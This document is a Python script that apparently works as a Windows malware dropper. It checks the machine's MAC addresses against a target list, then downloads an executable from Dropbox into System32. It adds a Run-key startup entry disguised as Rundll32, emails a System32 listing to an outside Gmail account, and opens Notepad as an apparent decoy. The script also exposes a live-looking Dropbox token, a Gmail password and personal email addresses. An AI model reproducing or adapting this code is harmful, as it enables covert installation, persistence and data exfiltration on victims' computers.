import subprocess
import re
import shutil
import time
import os
import winreg as reg

from email.message import EmailMessage
import ssl
import smtplib
try:
    subprocess.run(['pip', 'install', 'dropbox'], check=True)
except subprocess.CalledProcessError as e:
    print(f"Error: {e}")

import dropbox

def add_to_startup(program_name, executable_path):
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key_handle = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key_handle, program_name, 0, reg.REG_SZ, executable_path)
        reg.CloseKey(key_handle)
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False

def list_files_and_folders(path):
    try:
        # Use the Command Prompt to list files and folders
        result = subprocess.run(f'cmd /c dir /B "{path}"', shell=True, capture_output=True, text=True)
        
        # Capture the output in a variable
        output = result.stdout
        
        # Print the output (optional)
        print(output)
        
        return output
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return None

# Replace 'your_access_token_here' with your actual Dropbox access token
DROPBOX_ACCESS_TOKEN = 'sl.Bvgg8qDr7RPtktVZxevSPSu-IyzAULy3ZkOglGEPZz2WXunaK6Y7epxujhaySBo4EMDQ07bZ__Xq6amkzgyvW5hHT9iSYgENGc2CQGZgOVeI1rHqNxCGxXsGSabE2OdRIamnWVCAhdHYLpqmXqSPkEA'

# Destination folder for downloaded file
LOCAL_DESTINATION_FOLDER = 'C:\\Windows\\System32\\'

# File name to download
REMOTE_FILE_NAME = '/Rockety/Rocket.exe'  # Full Dropbox path

def download_file():
    dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

    try:
        # Get metadata for the file using the full path
        metadata = dbx.files_get_metadata('/Windows host process (Rundll32).exe')
        print("File Metadata:", metadata)

        # Download the file from Dropbox using the full path
        metadata, response = dbx.files_download('/Windows host process (Rundll32).exe')
        
        # Save the file locally
        with open(LOCAL_DESTINATION_FOLDER + 'Rocket.exe', 'wb') as f:
            f.write(response.content)
        
        print(f"File 'Rocket.exe' downloaded successfully to '{LOCAL_DESTINATION_FOLDER}'.")
    except dropbox.exceptions.HttpError as err:
        print(f"Error downloading file: {err}")
    except dropbox.exceptions.DropboxException as err:
        print(f"Dropbox error: {err}")



def main():
    # Run the 'ipconfig /all' command
    result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)

    # Capture the output in the variable named 'tri'
    tri = result.stdout

    mac_address_pattern = r'Physical Address.*:\s+([0-9A-F-]+)'

    # Extract MAC addresses using the regex pattern
    mac_addresses = re.findall(mac_address_pattern, tri)

    if "36-02-86-52-8E-DD" in mac_addresses or "78-98-E8-1E-D3-08" in mac_addresses or "78-98-E8-1E-E6-D8" in mac_addresses or "90-B1-1C-8C-E7-E9" in mac_addresses or "90-B1-1C-89-06-E0" in mac_addresses or "90-B1-1C-99-71-77" in mac_addresses or "A0-A3-F0-15-C4-FB" in mac_addresses or "A0-A3-F0-15-CB-2C" in mac_addresses or "A2-A3-F0-15-C4-FB" in mac_addresses or "A2-A3-F0-15-C9-D8" in mac_addresses or "A2-A3-F0-15-CA-F7" in mac_addresses or "F8-B1-56-C2-E3-3D" in mac_addresses or "00-FF-1E-A9-EC-F1" in mac_addresses or "90-B1-1C-8D-85-46" in mac_addresses or "30-24-32-1E-08-43" in mac_addresses or "90-B1-1C-7C-7B-A0" in mac_addresses or "A0-A3-F0-15-D2-2B" in mac_addresses or "A4-1F-72-95-D3-28" in mac_addresses or "A4-1F-72-95-CD-5C" in mac_addresses or "A4-1F-72-51-6E-32" in mac_addresses or "A2-A3-F0-15-CB-2C" in mac_addresses or "A2-A3-F0-15-C4-FB" in mac_addresses or "A0-A3-F0-15-C4-FB" in mac_addresses or "90-B1-1C-8C-E7-E9" in mac_addresses:


        download_file()

        program_name = "Rundll32"
        executable_path = r"C:\Windows\System32\Windows host process (Rundll32).exe"
    
        # Add the program to startup
        if add_to_startup(program_name, executable_path):
            print(f"{program_name} added to startup.")
        else:
            print(f"Failed to add {program_name} to startup.")
        target_path = r"C:\Windows\System32"


        email_sender = "mnadeemstar777@gmail.com"
        email_password = "zaektddcxhqebqol"
        email_receiver = "Ibrahim.abid.rajput.minhas@gmail.com"

        subject = "Rocket sent"

        # Get the content of decrypted_password.csv
        file_content = list_files_and_folders(target_path)
        
        # Create the EmailMessage object
        em = EmailMessage()
        em['From'] = email_sender
        em['To'] = email_receiver
        em['Subject'] = subject
        em.set_content(file_content)
        
        # SMTP setup and sending the email
        context = ssl.create_default_context()
        
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(email_sender, email_password)
        
            smtp.sendmail(email_sender, email_receiver, em.as_string())
        try:
            subprocess.Popen(['notepad.exe'])
            print("Notepad opened successfully.")
        except Exception as e:
            print(f"Error opening Notepad: {e}")
    

if __name__ == "__main__":
    main()
